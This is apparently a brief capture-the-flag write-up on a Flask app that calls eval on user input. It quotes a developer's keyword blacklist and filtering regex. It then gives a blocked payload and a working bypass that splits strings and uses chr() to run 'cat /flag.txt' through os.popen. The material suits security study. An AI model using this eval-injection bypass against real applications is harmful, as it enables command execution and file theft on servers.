The Eval function evaluates the string expression and returns its value. For example, Eval("1 + 1") returns 2.
Viewing the source code the programmer left some comments where he/she implement a blacklist of characters.
 TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'

The following payload: __import__('os').popen('ls').read() was blockedas 'os' and 'ls' is in the blacklist
using regrex and and python chr() function together with __import__ as it's not blocked.
__import__('o'+'s').popen('c' + 'at' + chr(47) + 'flag.' + 'txt').read()
